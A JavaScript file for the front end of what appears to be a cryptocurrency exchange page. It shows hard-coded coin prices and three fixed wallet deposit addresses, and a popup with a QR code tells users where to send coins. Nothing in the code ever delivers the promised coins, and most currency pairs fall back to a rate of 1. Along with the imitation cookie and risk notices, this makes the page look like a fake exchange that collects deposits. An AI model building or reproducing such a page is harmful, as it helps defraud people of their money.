// Crypto prices and data
const prices = {
    BTC: 95000,
    ETH: 3070,
    SOL: 175,
    USDT: 1,
    USDC: 1,
    LTC: 105
};

const addresses = {
    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7'
};

// Current selections
let sendCrypto = 'BTC';
let getCrypto = 'ETH';

// Simple calculate function
function calculate() {
    const sendUSD = document.getElementById('sendUSD');
    if (!sendUSD) return;
    
    const usdValue = parseFloat(sendUSD.value) || 0;
    const cryptoAmount = usdValue / prices[sendCrypto];
    
    // Simple rate calculation
    let rate = 1;
    if (sendCrypto === 'BTC' && getCrypto === 'ETH') rate = 30.78897;
    if (sendCrypto === 'ETH' && getCrypto === 'BTC') rate = 0.0325;
    if (sendCrypto === 'BTC' && getCrypto === 'SOL') rate = 542.86;
    
    const receiveAmount = cryptoAmount * rate;
    const receiveUSD = receiveAmount * prices[getCrypto];
    
    // Update displays
    const sendCryptoEl = document.getElementById('sendCrypto');
    const getCryptoEl = document.getElementById('getCrypto');
    const getUSDEl = document.getElementById('getUSD');
    
    if (sendCryptoEl) sendCryptoEl.textContent = cryptoAmount.toFixed(8);
    if (getCryptoEl) getCryptoEl.textContent = receiveAmount.toFixed(8);
    if (getUSDEl) getUSDEl.value = receiveUSD.toFixed(2);
    
    // Update button
    const btnAmount = document.querySelector('.btn-amount');
    if (btnAmount) {
        btnAmount.textContent = `$${usdValue.toFixed(2)} → $${receiveUSD.toFixed(2)}`;
    }
}

// Show exchange popup
function showExchange() {
    const popup = document.getElementById('paymentPopup');
    if (!popup) return;
    
    // Calculate values
    const sendUSD = document.getElementById('sendUSD');
    const usdValue = parseFloat(sendUSD.value) || 0;
    const sendAmount = usdValue / prices[sendCrypto];
    
    // Update popup - they need to send the TOP crypto (sendCrypto)
    document.getElementById('cryptoToSend').textContent = sendCrypto;
    document.getElementById('amountToSend').textContent = sendAmount.toFixed(8);
    document.getElementById('cryptoCode').textContent = sendCrypto;
    document.getElementById('usdValue').textContent = usdValue.toFixed(2);
    document.getElementById('depositAddress').textContent = addresses[sendCrypto] || 'No address';
    
    // Update QR with the address for the TOP crypto
    const qr = document.querySelector('.qr-code img');
    if (qr && addresses[sendCrypto]) {
        qr.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${addresses[sendCrypto]}`;
    }
    
    popup.style.display = 'flex';
}

// Close payment popup
function closePaymentPopup() {
    const popup = document.getElementById('paymentPopup');
    if (popup) popup.style.display = 'none';
}

// Copy address
function copyAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        event.target.textContent = 'Copied!';
        setTimeout(() => {
            event.target.textContent = 'Copy';
        }, 2000);
    });
}

// Simple crypto selector
function selectCrypto(type) {
    const modal = document.getElementById('cryptoModal');
    if (modal) {
        modal.style.display = 'block';
        modal.setAttribute('data-selecting', type);
    }
}

// When page loads
document.addEventListener('DOMContentLoaded', function() {
    // USD input
    const sendUSD = document.getElementById('sendUSD');
    if (sendUSD) {
        sendUSD.addEventListener('input', calculate);
    }
    
    // Exchange button
    const exchangeBtn = document.getElementById('exchangeBtn');
    if (exchangeBtn) {
        exchangeBtn.addEventListener('click', showExchange);
    }
    
    // Close popup
    const closeBtn = document.getElementById('closePopup');
    if (closeBtn) {
        closeBtn.addEventListener('click', closePaymentPopup);
    }
    
    // Cookie accept
    const acceptBtn = document.querySelector('.accept-btn');
    if (acceptBtn) {
        acceptBtn.addEventListener('click', function() {
            const notice = document.querySelector('.cookie-notice');
            if (notice) notice.style.display = 'none';
        });
    }
    
    // Risk info
    const riskBtn = document.getElementById('riskInfoBtn');
    if (riskBtn) {
        riskBtn.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'block';
        });
    }
    
    // Close risk modal
    const closeRisk = document.getElementById('closeModal');
    if (closeRisk) {
        closeRisk.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    const understandBtn = document.getElementById('understandBtn');
    if (understandBtn) {
        understandBtn.addEventListener('click', function() {
            const modal = document.getElementById('riskModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    // Crypto selectors
    const sendCryptoBox = document.getElementById('sendCryptoDisplay');
    if (sendCryptoBox) {
        sendCryptoBox.addEventListener('click', function() {
            selectCrypto('send');
        });
    }
    
    const getCryptoBox = document.getElementById('getCryptoDisplay');
    if (getCryptoBox) {
        getCryptoBox.addEventListener('click', function() {
            selectCrypto('get');
        });
    }
    
    // Close crypto modal
    const closeCrypto = document.getElementById('closeCryptoModal');
    if (closeCrypto) {
        closeCrypto.addEventListener('click', function() {
            const modal = document.getElementById('cryptoModal');
            if (modal) modal.style.display = 'none';
        });
    }
    
    // Crypto selection
    const cryptoItems = document.querySelectorAll('.crypto-item');
    cryptoItems.forEach(item => {
        item.addEventListener('click', function() {
            const crypto = this.getAttribute('data-crypto');
            const modal = document.getElementById('cryptoModal');
            const selecting = modal.getAttribute('data-selecting');
            
            if (selecting === 'send') {
                sendCrypto = crypto;
                document.getElementById('sendCryptoCode').textContent = crypto;
                document.getElementById('sendCryptoEmoji').textContent = '₿';
            } else {
                getCrypto = crypto;
                document.getElementById('getCryptoCode').textContent = crypto;
                document.getElementById('getCryptoEmoji').textContent = '₿';
            }
            
            modal.style.display = 'none';
            calculate();
        });
    });
    
    // Initial calculation
    calculate();
});